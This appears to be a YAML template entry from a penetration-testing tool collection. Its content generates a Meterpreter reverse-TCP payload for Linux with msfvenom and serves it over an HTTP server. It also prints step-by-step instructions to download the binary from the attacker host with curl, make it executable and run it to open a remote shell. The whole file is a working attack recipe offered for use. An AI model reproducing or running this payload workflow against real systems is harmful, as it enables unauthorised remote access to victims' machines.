content: "mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please\
  \ wait...'; \\\nmsfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={{ attacker_ip\
  \ }} LPORT={{ shell_port }} -f elf > packstation/outbound/revshell.elf ; \\\necho\
  \ '================================================================'; \\\necho '\
  \                      ------Listener------                      '; \\\necho '1.\
  \ Start listener: {{ include('scripts/listener-msf-multi-handler-linux-x64-meterpreter-nonstaged.yaml')\
  \ }}'; \\\necho '================================================================';\
  \ \\\necho '                       -----Linux------                         '; \\\
  \necho '2. Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.elf\
  \ -o {{ delivery_path_linux }}/revshell.elf'; \\\necho '3. Make executable: chmod\
  \ +x {{ delivery_path_linux }}/revshell.elf'; \\\necho '4. Execute: {{ delivery_path_linux\
  \ }}/revshell.elf'; \\\necho '================================================================';\
  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
  \ delivery_outbound_port }} -d packstation/outbound\n"
